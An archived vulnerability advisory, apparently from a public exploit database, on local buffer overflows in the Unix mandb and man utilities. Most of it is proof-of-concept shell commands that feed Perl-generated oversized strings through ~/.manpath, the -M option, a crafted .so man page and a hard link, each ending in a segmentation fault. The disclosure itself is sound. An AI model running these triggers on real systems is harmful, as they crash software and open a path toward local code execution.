@@ -1,0 +1,33 @@
+source: http://www.securityfocus.com/bid/8303/info
+
+The mandb utility has been reported to be affected by multiple local buffer overflow vulnerabilities.
+
+These issues present themselves due to insufficient bounds checking performed on user-supplied data before it is copied into reserved buffers in memory. It has been reported that a local attacker may exploit these issues to execute arbitrary instructions in the context of the mandb utility.
+
+# cd /tmp
+# mkdir x
+# echo MANDB_MAP `perl -e 'print"x"x8100'` x >~/.manpath
+# mandb
+Segmentation fault
+
+(can also apply this to the "man" binary, by fooling it with links)
+# cd /tmp
+# mkdir x
+# ln /usr/bin/man mandb
+# echo MANDB_MAP `perl -e 'print"x"x8100'` x >~/.manpath
+# ./mandb
+Segmentation fault
+
+# man -M `perl -e 'print"/"x2100'`usr/share/man ls
+...(verbose)
+Segmentation fault
+
+# cd /tmp
+# mkdir man man/man1
+# echo .so `perl -e 'print"x"x1024'` >man/man1/x.1
+# man -M /tmp/man x
+...(verbose)
+Segmentation fault
+
+# man -M `perl -e 'print"/tmp:"x260'` x
+Segmentation fault
